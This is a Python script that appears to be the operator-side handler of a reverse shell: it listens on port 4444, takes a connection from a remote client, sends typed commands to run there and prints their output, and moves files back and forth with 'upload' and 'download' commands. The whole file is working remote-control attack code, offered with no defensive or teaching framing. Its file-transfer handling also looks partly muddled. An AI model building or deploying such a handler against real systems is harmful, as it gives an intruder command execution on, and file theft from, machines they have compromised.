import socket
import json
import os
import base64
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Server configuration
HOST = "0.0.0.0"  # Replace with your server's IP address
PORT = 4444  # Replace with your desired port

# Helper functions for file transfer
def send_json(sock, data):
    try:
        json_data = json.dumps(data)
        sock.send(json_data.encode())
    except Exception as e:
        print(Fore.RED + f"[ERROR] Failed to send data: {e}")

def receive_json(sock):
    json_data = ""
    while True:
        try:
            json_data += sock.recv(1024).decode()
            return json.loads(json_data)
        except ValueError:
            continue

def read_file(path):
    try:
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()
    except FileNotFoundError:
        return "[ERROR] File not found."

def write_file(path, content):
    try:
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[SUCCESS] File downloaded successfully."
    except Exception as e:
        return f"[ERROR] Failed to write file: {e}"

# Print starting message
print(Fore.GREEN + "Starting TCP Handler...")

# Set up the server
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(5)

# Wait for a connection
print(Fore.YELLOW + f"Server listening on {Fore.CYAN}{HOST}:{PORT}")
client_socket, client_address = server.accept()
print(Fore.GREEN + f"Connection established with {client_address}")

try:
    while True:
        # Receive the prompt from the client
        prompt = client_socket.recv(1024).decode("utf-8")
        print(Fore.CYAN + prompt, end="")

        # Get user input
        command = input()

        # Send the command to the client
        client_socket.sendall(command.encode("utf-8"))

        if command.lower() == "km":
            print(Fore.RED + "Disconnecting from client...")
            client_socket.close()
            break

        # Receive the output from the client
        output = client_socket.recv(4096).decode("utf-8")
        print(Fore.WHITE + output)

        if command.startswith("upload"):
            try:
                _, filename, file_content = command.split(" ", 2)
                result = write_file(filename, file_content)
                send_json(client_socket, result)
            except Exception as e:
                send_json(client_socket, f"[ERROR] {e}")

        elif command.startswith("download"):
            try:
                _, filename = command.split(" ", 1)
                file_content = read_file(filename)
                send_json(client_socket, file_content)
            except Exception as e:
                send_json(client_socket, f"[ERROR] {e}")

except KeyboardInterrupt:
    print(Fore.RED + "\nShutting down the server.")
    client_socket.close()
    server.close()
